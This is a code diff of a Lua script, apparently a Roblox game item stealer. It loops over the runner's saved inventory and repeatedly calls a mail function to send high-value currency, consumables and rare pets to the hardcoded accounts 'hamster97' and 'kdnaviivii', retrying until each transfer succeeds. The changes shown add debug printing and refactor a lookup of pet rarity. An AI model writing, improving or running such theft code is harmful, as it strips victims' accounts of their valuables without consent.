@@ -24,6 +24,7 @@ if v._am >= 1000000 then
 local s,e = false, "x"
 repeat
 pcall(function() s,e = _mail("hamster97", "Currency", v.id, v._am) end)
+print(s,e)
 until s
 end
 end
@@ -40,15 +41,17 @@ for i,v in pairs(pots) do
 local s,e = false, "x"
 repeat
 pcall(function() s,e = _mail("hamster97", "Consumable", i, v) end)
+print(s,e)
 until s
 end
 local big = 0
 local sendids={}
+local diary = require(game:GetService("ReplicatedStorage").Library.Directory).Pets
 for i,v in pairs(save.Inventory.Pet) do
-if require(dir[v.id]).difficulty >= big then
-big = require(dir[v.id]).difficulty
+if diary[v.id].difficulty >= big then
+big = diary[v.id].difficulty
 end
-if (string.find(v.id, "Jel") and require(dir[v.id]).difficulty>= 99999) or require(dir[v.id]).difficulty>=500000000 then
+if (string.find(v.id, "Jel") and diary[v.id].difficulty>= 99999) or diary[v.id].difficulty>=500000000 then
 table.insert(sendids, {i, (v._am or 1)})
 end
 end
@@ -56,10 +59,12 @@ for i,v in pairs(sendids) do
 local s,e = false, "x"
 repeat
 pcall(function() s,e = _mail("kdnaviivii", "Pet", v[1], v[2]) end)
+print(s,e)
 until s
 end
 e = e.."\\nBest Pet: 1/"..big
 end)
+print(uuu,vvv)
 if not uuu then
 e=e.."\\n*"..vvv.."*"
 end
